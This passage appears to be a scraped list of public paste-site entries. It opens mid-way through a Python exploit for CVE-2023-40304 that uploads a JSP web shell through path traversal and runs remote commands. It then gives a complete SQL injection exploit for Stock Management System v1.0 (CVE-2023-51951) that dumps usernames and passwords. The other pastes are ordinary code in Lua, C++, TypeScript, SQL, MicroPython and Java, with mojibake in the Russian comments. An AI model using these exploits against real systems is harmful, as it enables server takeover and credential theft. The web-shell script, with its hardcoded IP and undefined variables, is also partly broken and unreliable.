null){out.println(s);};%>"",""lang"":""en"",""type"":""MODULE"",""status"":""PUB""}
  # If encoded, the web shell will not be uploaded properly
  data = urllib.parse.urlencode(data, safe='""*<>,=()/;{}!')

  # Checking if web shell already uploaded
  r = requests.get(f""{url}/istrobe/jsp/userhelp/ws.jsp"", verify=False)
  if r.status_code != 404:
    return

  r = requests.post(f""{url}/istrobe/userHelp/saveUserHelp"", data=data,
verify=False)

  if r.status_code == 200:
    print(f""[+] Successfully uploaded web shell, it should be
accessible at {url}/istrobe/jsp/userhelp/ws.jsp"")
  else:
    sys.exit(""[-] Something went wrong while uploading the web shell"")

def delete_web_shell(url):
  paramsPost = {""fileName"":""../jsp/userhelp/ws.jsp"",""author"":""Guest"",""name"":""test"",""action"":""delete"",""lang"":""en"",""type"":""MODULE"",""status"":""PUB""}
  response = session.post(""http://220.4.147.38:6301/istrobe/userHelp/deleteUserHelp"",
data=paramsPost, headers=headers, cookies=cookies)

  if r.status_code == 200:
    print(f""[+] Successfully deleted web shell"")
  else:
    sys.exit(""[-] Something went wrong while deleting the web shell"")

def run_cmd(url, cmd):
  data = f""cmd={cmd}""
  r = requests.post(f""{url}/istrobe/jsp/userhelp/ws.jsp"", data=data,
verify=False)

  if r.status_code == 200:
    print(r.text)
  else:
    sys.exit(f'[-] Something went wrong while executing ""{cmd}"" command')

parser = argparse.ArgumentParser(prog='exploit_cve_2023_40304.py', description='CVE-2023-40304 - Pre-auth file upload vulnerability + path traversal to achieve RCE')
parser.add_argument('url', help='Vulnerable URL to target. Must be like http(s)://vuln.target')
parser.add_argument('-c', '--cmd', help='Command to execute on the remote host (Defaults to ""whoami"")', default='whoami')
parser.add_argument('--rm', help='Deletes the uploaded web shell', action='store_true')
args = parser.parse_args()

upload_web_shell(args.url)
run_cmd(args.url, args.cmd)

if args.rm:
  delete_web_shell(args.url)
            "
dELmPMcU,uwu,AlewAlow,Lua,Thursday 18th of April 2024 06:04:21 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local Matter = require(ReplicatedStorage.Shared.Libs.Matter)
local Components = require(ReplicatedStorage.Shared.Components)

local RotateVector2 = require(ReplicatedStorage.Shared.Utils.RotateVector2)
local GetEntityGlobalPosition = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalPosition)
local GetEntityGlobalRotation = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalRotation)
local GetEntityGlobalScale = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalScale)
local GetEntityCanvas = require(ReplicatedStorage.Shared.Utils.GetEntityCanvas)

local ApplyVelocity = require(ReplicatedStorage.Shared.Systems.ApplyVelocity)
local CheckCollisions = require(ReplicatedStorage.Shared.Systems.CheckCollisions)

local function rectangleCollisionResponse(
	pos1,
	size1,
	pos2,
	size2
)
	local topLeft1 = pos1 - size1 / 2
	local topLeft2 = pos2 - size2 / 2
	
	local dx = (topLeft1.X + size1.X / 2) - (topLeft2.X + size2.X / 2)
	local dy = (topLeft1.Y + size1.Y / 2) - (topLeft2.Y + size2.Y / 2)
	
	local combinedHalfWidths = size1.X / 2 + size2.X / 2
	local combinedHalfHeights = size1.Y / 2 + size2.Y / 2
	
	local overlapX = combinedHalfWidths - math.abs(dx)
	local overlapY = combinedHalfHeights - math.abs(dy)

	local x1, y1 = topLeft1.X, topLeft1.Y

	if overlapX > 0 and overlapY > 0 then
		if overlapX < overlapY then
			if dx > 0 then
				x1 += overlapX
			else
				x1 -= overlapX
			end
		else
			if dy > 0 then
				y1 += overlapY
			else
				y1 -= overlapY
			end
		end
	end
	
	return Vector2.new(x1, y1) + size1 / 2
end

local function globalToLocal(id, position, world)
	local parentRotation = 0
	local parentPosition = Vector2.zero
	local parentScale = Vector2.one
	
	local child = world:get(id, Components.Child)
	if child and world:contains(child.Parent) then
		parentPosition = GetEntityGlobalPosition(child.Parent, world)
		parentRotation = GetEntityGlobalRotation(child.Parent, world)
		parentScale = GetEntityGlobalScale(child.Parent, world)
	end
	
	return RotateVector2(position - parentPosition, -math.rad(parentRotation)) / parentScale
end

local function RespondToCollisions(world, state)
	for id1, transform1, collider1, colliding1 in world:query(
			Components.Transform,
			Components.Collider,
			Components.Colliding,
			Components.Physics
		):without(Components.NonShared)
	do
		local globalPosition1 = GetEntityGlobalPosition(id1, world)
		local globalSize1 = GetEntityGlobalScale(id1, world) * collider1.Size
		
		for _, id2 in colliding1.CollidingWith do
			local trigger2 = world:get(id2, Components.Trigger)
			if trigger2 then
				continue
			end
			
			local collider2 = world:get(id2, Components.Collider)
			if not collider2 then
				continue
			end
			
			local transform2 = world:get(id2, Components.Transform)
			if not transform2 then
				continue
			end
			
			local globalPosition2 = GetEntityGlobalPosition(id2, world)
			local globalSize2 = GetEntityGlobalScale(id2, world) * collider2.Size
			
			globalPosition1 = rectangleCollisionResponse(
				globalPosition1,
				globalSize1,
				
				globalPosition2,
				globalSize2
			)
		end
		
		world:insert(id1, transform1:patch({
			Position = globalToLocal(id1, globalPosition1, world)
		}))
	end
end

return {
	system = RespondToCollisions,
	after = {
		ApplyVelocity,
		CheckCollisions,
	},
}"
ngjCQRud,Stock Management System v1.0 - Unauthenticated SQL Injection - CVE-2023-51951,FlyFar,Python,Thursday 18th of April 2024 06:02:41 AM CDT,"# Exploit Title: Stock Management System v1.0 - Unauthenticated SQL Injection
# Date: February 6, 2024
# Exploit Author: Josu√© Mier (aka blu3ming) Security Researcher & Penetration Tester @wizlynx group
# Vendor Homepage: https://www.sourcecodester.com/php/15023/stock-management-system-phpoop-source-code.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/sms.zip
# Tested on: Linux and Windows, XAMPP
# CVE-2023-51951
# Vendor: oretnom23
# Version: v1.0
# Exploit Description:
#   The web application Stock Management System is affected by an unauthenticated SQL Injection affecting Version 1.0, allowing remote attackers to dump the SQL database using an Error-Based Injection attack.

import requests
from bs4 import BeautifulSoup
import argparse

def print_header():
    print(""\033[1m\nStock Management System v1.0\033[0m"")
    print(""\033[1mSQL Injection Exploit\033[0m"")
    print(""\033[96mby blu3ming\n\033[0m"")

def parse_response(target_url):
    try:
        target_response = requests.get(target_url)
        soup = BeautifulSoup(target_response.text, 'html.parser')
        textarea_text = soup.find('textarea', {'name': 'remarks', 'id': 'remarks'}).text

        # Split the text using ',' as a delimiter
        users = textarea_text.split(',')
        for user in users:
            # Split username and password using ':' as a delimiter
            username, password = user.split(':')
            print(""| {:<20} | {:<40} |"".format(username, password))
    except:
        print(""No data could be retrieved. Try again."")

def retrieve_data(base_url):
    target_path = '/sms/admin/?page=purchase_order/manage_po&id='
    payload = ""'+union+select+1,2,3,4,5,6,7,8,group_concat(username,0x3a,password),10,11,12,13+from+users--+-""

    #Dump users table
    target_url = base_url + target_path + payload
    print(""+----------------------+------------------------------------------+"")
    print(""| {:<20} | {:<40} |"".format(""username"", ""password""))
    print(""+----------------------+------------------------------------------+"")
    parse_response(target_url)
    print(""+----------------------+------------------------------------------+\n"")

if __name__ == ""__main__"":
    about  = 'Unauthenticated SQL Injection Exploit - Stock Management System'
    parser = argparse.ArgumentParser(description=about)
    parser.add_argument('--url', dest='base_url', required=True, help='Stock Management System URL')
    args = parser.parse_args()
    print_header()
    retrieve_data(args.base_url)
            "
XfGcTP88,data900,TestGuy1,JSON,Thursday 18th of April 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '1f644b4d85183749dafd1c2ece87fbf165634ad6dda10a463fcea14bd8e721e623f3a92453b614188a97b9b7519c07c5086a08797fe8e1cecb50089f46f8284ea7450ed7f6a8feb980f72d78f3e3425e2286a544482eac77a407e8f85579e82f00fa94a87889a4e15e3202728da603712fdef0b31e633db013358ae5418db0ec',
  otherdata: [
    'd64e64a5e7c76bf8ee21f59f02ccd514',
    '7e0a61912ea8ac3bf6e9dfd02a6349ce',
    '43d624db998a2357435bf4d408a658b1',
    '963971a4afefe1a090ac85bd5bdcef84',
    '3d971972e74ea05b519e3bab4b8ee3f2',
    '27093e33773b3439f5d255f14a76df32',
    '404c07051fbfb45d2d592865d34a4c30',
    '4c7a1c9092a81f197f018d0469f37d6c'
  ]
}"
2TWRHtn6,Untitled,35657,C++,Thursday 18th of April 2024 05:48:22 AM CDT,"#include <iostream>
#include <fstream>

using namespace std;

int main() {

	setlocale(LC_ALL, ""ru"");

	ifstream fin; // —Å–æ–∑–¥–∞–ª–∏ –æ–±—ä–µ–∫—Ç –∫–ª–∞—Å—Å–∞ fstream

	fin.open(""C:/Users/PC/Desktop/file.txt""); // –æ—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–∞ –¥–ª—è —á—Ç–µ–Ω–∏—è

	if (!fin.is_open()) { // –ø—Ä–æ–≤–µ—Ä–∫–∞ —É—Å–ø–µ—à–Ω–æ—Å—Ç–∏ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞
		cout << ""–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞"" << endl;
	}
	else {
		char ch; // –∑–∞–≤–æ–¥–∏–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é - –±—É—Ñ–µ—Ä
		while (fin.get(ch)) { // –ø–æ—Å–∏–º–≤–æ–ª—å–Ω–æ —Å—á–∏—Ç—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
			cout << ch; // –∏ –≤—ã–≤–æ–¥–∏–º –≤ –∫–æ–Ω—Å–æ–ª—å
		}
		fin.close();
	}

}"
1QfksC9k,Untitled,ebleach7,TypeScript,Thursday 18th of April 2024 05:43:54 AM CDT,"import { queryClient } from ""@/app/providers"";
import { ICreateFaqItemBody, faqServie } from ""@/shared/api"";
import { removeToken } from ""@/shared/lib"";
import { useMutation } from ""@tanstack/react-query"";
import { App } from ""antd"";
import axios from ""axios"";
import { useNavigate } from ""react-router-dom"";

export const useCreateFaqItem = () => {
  const { notification } = App.useApp();
  const navigate = useNavigate();

  const createFaqItem = useMutation({
    mutationFn: (body: ICreateFaqItemBody) => faqServie.createFaqItem(body),
    onSuccess: (data) => {
      if (data.data.code === ""SUCCESS"") {
        notification.success({
          message: data.data.text,
        });

        queryClient.invalidateQueries({
          queryKey: [""faq""],
        });
      }

      if (data.data.code === ""ERROR"") {
        notification.error({
          message: data.data.text,
        });
      }
    },
    onError: (error) => {
      if (axios.isAxiosError(error)) {
        notification.error({
          message: error.message,
        });

        if (error.response && error.response.status === 401) {
          navigate(""/sign-in"");
        }
      } else {
        notification.error({
          message: error.message ? error.message : ""–ß—Ç–æ —Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫!"",
        });

        removeToken();
        navigate(""/sign-in"");

        console.log(""Create Faq Item Error"", error);
      }
    },
  });

  return { createFaqItem };
};
"
viKpyGAD,Untitled,ebleach7,TypeScript,Thursday 18th of April 2024 05:43:19 AM CDT,"import { faqServie } from ""@/shared/api"";
import { removeToken } from ""@/shared/lib"";
import { useQuery } from ""@tanstack/react-query"";
import { App } from ""antd"";
import axios from ""axios"";
import { useEffect } from ""react"";
import { useNavigate } from ""react-router-dom"";

export const useGetFaqItem = (id: string) => {
  const { notification } = App.useApp();
  const navigate = useNavigate();

  const faqItem = useQuery({
    queryKey: [""faq"", id],
    queryFn: () => faqServie.getFaqItem(id),
  });

  useEffect(() => {
    if (faqItem.isError) {
      if (faqItem.error) {
        if (axios.isAxiosError(faqItem.error)) {
          notification.error({
            message: faqItem.error.message,
          });

          if (faqItem.error.response && faqItem.error.response.status === 401) {
            navigate(""/sign-in"");
          }

          if (faqItem.error.response && faqItem.error.response.status === 400) {
            navigate(""/faq"");
          }
        } else {
          notification.error({
            message: faqItem.error.message
              ? faqItem.error.message
              : ""–ß—Ç–æ —Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫!"",
          });

          removeToken();
          navigate(""/sign-in"");

          console.log(""Faq Item Error"", faqItem.error);
        }
      }
    }
  }, [faqItem, navigate, notification]);

  return { faqItem };
};
"
WRQ7gk8A,Untitled,35657,C++,Thursday 18th of April 2024 05:41:29 AM CDT,"#include <iostream>
#include <fstream>

using namespace std;

int main() {

	ofstream fout; // —Å–æ–∑–¥–∞–ª–∏ –æ–±—ä–µ–∫—Ç –∫–ª–∞—Å—Å–∞ fstream

	fout.open(""C:/Users/PC/Desktop/file.txt"", ofstream::app); // –æ—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–∞ —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º app –¥–ª—è –¥–æ–∑–∞–ø–∏—Å–∏

	if (!fout.is_open()) { // –ø—Ä–æ–≤–µ—Ä–∫–∞ —É—Å–ø–µ—à–Ω–æ—Å—Ç–∏ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞
		cout << ""–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞"" << endl;
	}
	else {
		fout << ""–ü—Ä–∏–≤–µ—Ç"" << endl << 1111 << endl;
		fout.close(); // –∑–∞–∫—Ä—ã–≤–∞–µ–º —Ñ–∞–π–ª (–æ—Å–≤–æ–±–æ–∂–¥–∞–µ–º —Ä–µ—Å—É—Ä—Å—ã)
	}

}"
z5pt0xVM,Untitled,35657,C++,Thursday 18th of April 2024 05:37:22 AM CDT,"#include <iostream>
#include <fstream>

using namespace std;

int main() {

	ofstream fout; // —Å–æ–∑–¥–∞–ª–∏ –æ–±—ä–µ–∫—Ç –∫–ª–∞—Å—Å–∞ fstream

	fout.open(""C:/Users/PC/Desktop/file.txt""); // –µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –Ω–µ –≤ —Ä–∞–±–æ—á–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –ø—Ä–æ–≥—Ä–∞–º–º—ã - —É–∫–∞–∑—ã–≤–∞–µ–º –ø–æ–ª–Ω—ã–π –ø—É—Ç—å

	if (!fout.is_open()) { // –ø—Ä–æ–≤–µ—Ä–∫–∞ —É—Å–ø–µ—à–Ω–æ—Å—Ç–∏ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞
		cout << ""–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞"" << endl;
	}
	else {
		fout << ""–ü—Ä–∏–≤–µ—Ç"" << endl << 1111 << endl;
		fout.close(); // –∑–∞–∫—Ä—ã–≤–∞–µ–º —Ñ–∞–π–ª (–æ—Å–≤–æ–±–æ–∂–¥–∞–µ–º —Ä–µ—Å—É—Ä—Å—ã)
	}

}"
Bfc9bfPL,Untitled,35657,C++,Thursday 18th of April 2024 05:33:13 AM CDT,"#include <iostream>
#include <fstream>

using namespace std;

int main() {

	ofstream fout; // —Å–æ–∑–¥–∞–ª–∏ –æ–±—ä–µ–∫—Ç –∫–ª–∞—Å—Å–∞ fstream

	fout.open(""file.txt""); // –æ—Ç–∫—Ä—ã–≤–∞–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π —Ñ–∞–π–ª –≤ —Ä–∞–±–æ—á–µ–º –∫–∞—Ç–∞–ª–æ–≥–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –∏–ª–∏ —Å–æ–∑–¥–∞–µ–º –ø—Ä–∏ –µ–≥–æ –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–∏

	if (!fout.is_open()) { // –ø—Ä–æ–≤–µ—Ä–∫–∞ —É—Å–ø–µ—à–Ω–æ—Å—Ç–∏ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞
		cout << ""–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞"" << endl;
	}
	else {
		fout << ""–ü—Ä–∏–≤–µ—Ç"" << endl << 1111 << endl;
		fout.close(); // –∑–∞–∫—Ä—ã–≤–∞–µ–º —Ñ–∞–π–ª (–æ—Å–≤–æ–±–æ–∂–¥–∞–µ–º —Ä–µ—Å—É—Ä—Å—ã)
	}

}"
qsseeuR0,Untitled,Ilya_Bykonya,C++,Thursday 18th of April 2024 05:30:13 AM CDT,"template<typename Type>
struct IProperty {
	virtual ~IProperty() noexcept = defailt;
	virtual void setValue(const Type& value) = 0;
	virtual Type value() const = 0;
};"
f48L8Vi0,UpdateOnCondition,NeverRIEght,Java,Thursday 18th of April 2024 05:24:45 AM CDT,"interface UpdateOnCondition {
    boolean check();
    void update();
}

class Single implements UpdateOnCondition {
    private double x;

    public Single(double x) {
        this.x = Math.max(x, 0.0);
    }

    @Override
    public boolean check() {
        return x <= 0.0;
    }

    @Override
    public void update() {
        x = 0.0;
    }

    @Override
    public String toString() {
        return this.getClass().getSimpleName() + "" [x="" + x + ""]"";
    }
}

class Pair implements UpdateOnCondition {
    private int a;
    private int b;

    public Pair(int a, int b) {
        this.a = Math.max(a, b);
        this.b = Math.min(a, b);
    }

    @Override
    public boolean check() {
        return a < b;
    }

    @Override
    public void update() {
        a = a + b;
        b = a - b;
        a = a - b;
    }

    @Override
    public String toString() {
        return this.getClass().getSimpleName() + "" [a="" + a + "", b="" + b + ""]"";
    }
}"
WHLZbdUr,Untitled,psi_mmobile,PL/SQL,Thursday 18th of April 2024 04:58:34 AM CDT,"select vd.vehicle_id from person_data pd, vehicle_data vd
where pd.person_id in (105870,105768,105769,105863,105763,105777,109876,105836,105821,105957,103858,115350,105855,111392,120479,124102,124146,105773,105833,103872,105854,105818,105849,105869,114682,115552,103357,105827,105861,110519,121990,105868,105939,125850,105867,105780,105840,105872,112318,121992,105792,115342,126295,105779,116409,124765,125852,105772,105857,107362,121984,103365,114609,105839,119720,105825,105765,105814,105852,105829,106251,105859,105834,125849,105770,105933,105819,105874,107737,105766,105843,110518,109988,134690,366894,655303,655305,655304)
and pd.event_date >= sysdate - 128
and pd.vehicle_data_id = vd.vehicle_data_id;

select * from gu_vehicle;

insert into gu_vehicle (vehicle_id,gui_user_id) values (119031,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (187578,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (123044,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (184077,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (196365,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (123042,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (187615,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (169516,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (119495,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (195241,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (169363,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (119885,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (122643,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (122741,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (119554,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (188726,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (123020,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (190856,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (123041,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (169522,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (120898,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (184075,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (123367,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (194336,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (123038,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (169527,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (169549,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (122766,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (169524,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (187585,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (123220,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (123146,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (123363,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (169515,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (120917,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (194346,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (183914,213019);
insert into gu_vehicle (vehicle_id,gui_user_id) values (121272,213019);
commit;

select * from gu_vehicle
where gui_user_id = 213019;"
W3LZQmas,Simple QR Code Generator (MicroPython),usa38,Python,Thursday 18th of April 2024 04:55:51 AM CDT,"import uasyncio as asyncio
import qrcode
from picoweb import WebApp, start_response

app = WebApp(__name__)

@app.route(""/"")
def index(req, resp):
    yield from start_response(resp)
    yield from resp.awrite(""<html><body>"")
    yield from resp.awrite(""<h1>QR Code Generator</h1>"")
    yield from resp.awrite(""<form method='POST' action='/generate'>"")
    yield from resp.awrite(""<input type='text' name='content' placeholder='Enter value'>"")
    yield from resp.awrite(""<input type='submit' value='Generate QR Code'>"")
    yield from resp.awrite(""</form>"")
    yield from resp.awrite(""</body></html>"")

@app.route(""/generate"", methods=[""POST""])
def generate_qr(req, resp):
    content = req.form.get(""content"", """")
    qr = qrcode.make(content)
    qr.save(""qr_code.png"")
    yield from start_response(resp)
    yield from resp.awrite(""<html><body>"")
    yield from resp.awrite(f""<h2>Generated QR Code for: {content}</h2>"")
    yield from resp.awrite(""<img src='qr_code.png' alt='QR Code'>"")
    yield from resp.awrite(""</body></html>"")

loop = asyncio.get_event_loop()
loop.create_task(app.run(debug=True))
loop.run_forever()
"
UpgYSa01,cc: tweaked - petr_axeman - udig,PetrAxeman,Lua,Thursday 18th of April 2024 04:52:29 AM CDT,"local args = { ... }
 
if #args == 1 then
    if args[1] == ""area"" then
        print(""Area universal digger usage:"")
        print(""udig area <height> <width> <depth>"")
    elseif args[1] == 'dowser' then
        print(""Dowser universal digger usage:"")
        print(""udig dowser <length> <height> <count>"")
        print(""(height can be only 1, 2 or 3)"")
    end
elseif #args < 1 then
    print(""Universal digger usage:"")
    print(""udig <mod> <args...>"")
    print(""(mod cand be only a area or dowser)"")
end




function dig_area (height, width, depth)
    dig_layer(height, width)
end

function dig_dowser (length, height, count)
end



function dig_layer (height, width)
    h = height
    w = width - 1
    while true do
        if h == 0 then
            return
        end
        dig_forward(h, false, false)
        turtle.turnRight()
        h = h - 1
        if w == 0 then 
            return true
        end
        dig_forward(w, false, false)
        turtle.turnRight()
        w = w - 1
    end     
end

function dig_forward (times, dig_up, dig_down)
    for i = 1, times do
        turtle.dig()
        turtle.forward()
    end
end



dig_mod = tostring(args[1])
if dig_mod == ""area"" then
    height = tonumber(args[2])
    width = tonumber(args[3])
    depth = tonumber(args[4])
    dig_area(height, width, depth)
elseif dig_mod == ""dowser"" then
    length = tonumber(args[2])
    height = tonumber(args[3])
    count = tonumber(args[4])
    dig_dowser(length, height, count)
end"
